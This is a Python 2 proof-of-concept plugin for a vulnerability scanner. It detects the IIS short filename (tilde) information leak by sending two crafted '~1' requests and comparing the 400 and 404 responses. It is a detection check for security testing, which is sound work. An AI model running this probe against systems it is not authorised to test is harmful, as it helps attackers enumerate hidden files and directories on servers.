# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'IIS_0000' # 平台漏洞编号
    name = 'IIS短文件名' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
       攻击者可利用此特性猜解出目录与文件名，以达到类似列目录漏洞的效果。
    ''' # 漏洞描述
    ref = 'Unknown' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'IIS'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7a0c709c-ec0d-4e5d-b27b-73852bc05c68' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            flag_400 = '/otua*~1.*/.aspx'
            flag_404 = '/*~1.*/.aspx'
            request = urllib2.Request(arg + flag_400)
            req = urllib2.urlopen(request, timeout=10)
            if int(req.code) == 400:
                req_404 = urllib2.urlopen(arg + flag_404, timeout=10)
                if int(req_404.code) == 404:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()